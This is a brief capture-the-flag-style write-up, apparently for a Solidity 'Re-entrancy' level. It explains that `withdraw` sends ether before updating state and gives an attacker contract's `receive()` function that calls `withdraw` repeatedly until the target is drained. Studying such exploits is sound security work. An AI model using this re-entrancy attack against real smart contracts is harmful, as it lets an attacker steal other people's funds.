# Re-entrancy

---
Objective: 
- Your goal is to break it.
---

Notes:

Only place where eth is sent out is in the `withdraw`
`(bool result,) = msg.sender.call{value:_amount}("");`

We send some eth, and get it. Then try to fallback to the withdraw function to withdrawl more

Since it thinks we are just a person, but we could be a contract. So we can execute code inside and re-enter the contract with calling `withdraw` until it is drained. 

```solidity
receive() external payable {
    uint amount = min(1e18, address(target).balance);
    if (amount > 0) {
        target.withdraw((1e18));
    }
}
```